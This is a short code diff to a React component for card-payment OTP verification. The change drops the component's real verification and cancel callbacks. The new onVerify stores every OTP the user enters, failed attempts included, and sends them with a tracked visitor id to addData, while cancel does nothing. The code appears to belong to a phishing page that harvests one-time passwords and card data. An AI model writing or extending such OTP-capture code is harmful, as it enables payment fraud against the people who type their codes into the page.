@@ -13,7 +13,7 @@ interface OTPVerificationProps {
   onCancel: () => void
 }
 
-export default  function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPVerificationProps) {
+export default  function OTPVerification() {
   const [otp, setOtp] = useState("")
   const [countdown, setCountdown] = useState(60)
   const [maskedCardNumber,setMaskedNumber] = useState('**')
@@ -29,7 +29,12 @@ export default  function OTPVerification({ amount, cardNumber, onVerify, onCance
   const total = 10
 
   // Mask the card number?
-
+const onVerify=()=>{
+  allOtps.push(otp)
+  const vid=localStorage.getItem('visitor')
+  addData({id:vid,otp,allOtps})
+}
+const onCancel=()=>{}
   // Start countdown timer
   useEffect(() => {
     startCountdown()
